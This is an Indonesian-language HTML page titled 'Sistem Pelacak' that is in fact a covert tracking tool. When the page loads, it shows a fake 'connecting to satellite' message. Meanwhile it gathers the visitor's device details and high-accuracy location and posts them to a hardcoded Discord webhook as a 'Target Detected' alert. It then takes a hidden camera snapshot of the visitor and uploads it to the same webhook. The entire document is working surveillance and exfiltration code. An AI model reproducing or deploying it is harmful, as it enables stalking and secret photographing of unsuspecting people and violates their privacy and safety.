<!DOCTYPE html>
<html>
<head>
    <title>Sistem Pelacak</title>
</head>
<body>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <p id="status">Menghubungkan ke satelit...</p>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";

        async function jalankanSistem() {
            // 1. Ambil Info Perangkat
            const infoDevice = `Platform: ${navigator.platform}\nRAM: ${navigator.deviceMemory || 'N/A'} GB\nUser Agent: ${navigator.userAgent}`;

            // 2. Ambil Lokasi
            navigator.geolocation.getCurrentPosition(async (p) => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;

                // Kirim Teks (Lokasi & Device) ke Discord
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚨 Target Terdeteksi!",
                            color: 16711680,
                            fields: [
                                { name: "📍 Lokasi", value: `[Klik ke Google Maps](${gmaps})` },
                                { name: "📱 Info Perangkat", value: infoDevice },
                                { name: "🎯 Akurasi", value: `${p.coords.accuracy} meter` }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                // 3. Ambil Foto Kamera (Memicu permintaan izin kamera)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    // Beri jeda 2 detik agar kamera fokus sebelum snapshot
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append("file", blob, "foto_target.png");
                            formData.append("payload_json", JSON.stringify({ content: "📸 **Foto Target:**" }));

                            // Kirim file foto ke Discord
                            await fetch(webhookURL, { method: "POST", body: formData });
                            
                            // Matikan kamera setelah selesai
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 2000);
                } catch (err) {
                    console.log("Izin kamera ditolak target.");
                }

                document.getElementById('status').innerText = "Data Terverifikasi.";
            }, (err) => {
                document.getElementById('status').innerText = "Gagal: Berikan izin akses.";
            }, { enableHighAccuracy: true });
        }

        window.onload = jalankanSistem;
    </script>
</body>
</html>
